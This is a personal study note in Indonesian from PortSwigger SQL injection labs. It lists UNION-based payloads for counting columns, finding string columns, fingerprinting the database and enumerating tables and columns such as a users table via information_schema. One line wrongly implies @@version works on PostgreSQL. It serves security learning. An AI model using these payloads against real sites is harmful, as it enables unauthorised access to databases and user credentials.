# TIL: SQL Injection Enumeration Tricks

> Catatan pribadi selama ngerjain lab SQLi di PortSwigger Web Security Academy.
> Bukan write-up lengkap, cuma kumpulan trik yang kepake pas enumerasi.

---

## 1. Cari Jumlah Kolom

**Metode ORDER BY** — naikin angka sampe error:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- kalau ini error (500), berarti kolomnya cuma 2
```

**Metode UNION SELECT NULL** — alternatif, tambah NULL satu-satu:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

---

## 2. Cari Kolom yang Bisa Nampung String

Setelah tau jumlah kolom, test satu-satu kolom mana yang nerima text
(kolom integer bakal error kalau diisi string):
```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

---

## 3. Deteksi Jenis DBMS

| DBMS | Ciri Khas |
|---|---|
| MySQL | Support `#` buat comment (selain `--`), pakai `CONCAT()` buat gabung string |
| MSSQL | Support stacked queries (`;`), bisa pakai `@@version` |
| Oracle | **Wajib** pakai `FROM DUAL` karena Oracle nggak bisa `SELECT` tanpa `FROM` |
| PostgreSQL | Support `||` buat concat string, punya `information_schema` lengkap |

Contoh payload Oracle:
```sql
' UNION SELECT 'text', NULL FROM DUAL--
```

Cek versi DB (MySQL/MSSQL/PostgreSQL):
```sql
' UNION SELECT @@version, NULL--
```

---

## 4. Enumerasi Nama Tabel (Filter ke Schema Public)

Masalah: `information_schema.tables` isinya banyak banget, termasuk tabel
internal (`pg_*`, `sql_*`, dll) yang bikin hasil numpuk dan susah dicari.

**Solusi:** filter pakai `table_schema='public'`
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
```

> ⚠️ Perhatiin penulisan: `table_schema`, bukan `table_schama` (typo umum).

---

## 5. Enumerasi Kolom dari Tabel Tertentu

Setelah dapet nama tabel target (misal `users_hybzgg`):
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_hybzgg'--
```

**Trik cepat (sekali jalan):** cari tabel + kolom sekaligus pakai `LIKE`
tanpa perlu dua langkah terpisah:
```sql
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name LIKE '%user%'--
```

---

## Referensi

Buat payload lengkap per-DBMS (blind, time-based, error-based, dll),
tetep cek [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
— file ini cuma versi "gua ngerti" dari apa yang udah gua praktekin.
